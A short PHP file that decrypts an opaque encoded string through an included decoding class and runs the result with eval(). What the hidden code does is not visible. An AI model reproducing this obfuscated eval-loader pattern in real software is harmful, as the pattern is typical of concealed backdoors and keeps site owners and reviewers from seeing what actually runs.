<?php
//error_reporting(0);
include('./inc/class_decode.php');
$kode_s = new Encryption_p();

$string="cj4BYxnSTwe6zMMwE44HSAEDoxkVhIH75XtKjZlcMSpKf6u1Ld-xHQi5snKaXPJn3CJajSD29a8WZQ73QXucVwz3zhsoqToIm4qssm7uctg-pYIfw385JZiX3qAZ292O1sg_CVHsL9YnClFCtAEE9MxXleq98hyBQUQaX8EiQlg";
//$string="cj4BYxnSTwe6zMMwE44HSAEDoxkVhIH75XtKjZlcMSp6VfM_NDF8AyOS3P0yhwp16dhMqLMJOuR7-U-NXdQmjwz3zhsoqToIm4qssm7uctg-pYIfw385JZiX3qAZ292O1sg_CVHsL9YnClFCtAEE9MxXleq98hyBQUQaX8EiQlg";


$string=$kode_s->decode_p($string);

eval("$string");



?>